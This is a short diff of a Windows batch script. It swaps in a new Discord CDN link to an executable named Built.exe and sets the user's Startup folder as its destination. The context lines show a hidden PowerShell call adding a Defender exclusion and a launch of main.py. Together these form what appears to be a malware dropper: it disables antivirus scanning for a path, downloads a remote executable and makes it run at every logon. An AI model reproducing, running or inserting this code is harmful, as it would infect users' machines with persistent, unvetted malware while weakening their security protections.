@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1048548868914151524/1255161085720268850/Built.exe?ex=667c1f5a&is=667acdda&hm=6b1d06eaa80beb6c6680cd7d829c4b0e24c56f3b054694784e0c5f45f0bc454a&"
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -24,7 +24,7 @@ start main.py
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1048548868914151524/1255161085720268850/Built.exe?ex=667c1f5a&is=667acdda&hm=6b1d06eaa80beb6c6680cd7d829c4b0e24c56f3b054694784e0c5f45f0bc454a&"
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
